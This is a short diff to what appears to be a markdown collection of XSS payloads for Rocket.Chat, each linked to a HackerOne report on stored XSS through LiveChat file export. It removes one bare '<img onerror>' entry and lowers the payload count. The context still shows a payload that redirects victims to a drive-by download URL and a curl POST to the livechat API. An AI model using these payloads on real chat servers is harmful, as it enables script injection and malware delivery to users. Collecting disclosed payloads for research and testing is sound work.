@@ -1,6 +1,6 @@
 # Rocket.Chat
 
-21 payloads.
+20 payloads.
 
 ### `4626c5f6`
 
@@ -242,14 +242,6 @@ curl -X POST http://TARGET:3000/api/v1/livechat/message \
 
 ```
 <img src=x onerror="location='https://target.com/drive-by-download'">
-```
-
-— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)
-
-### `07a7df4f`
-
-```
-<img onerror>
 ```
 
 — [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)
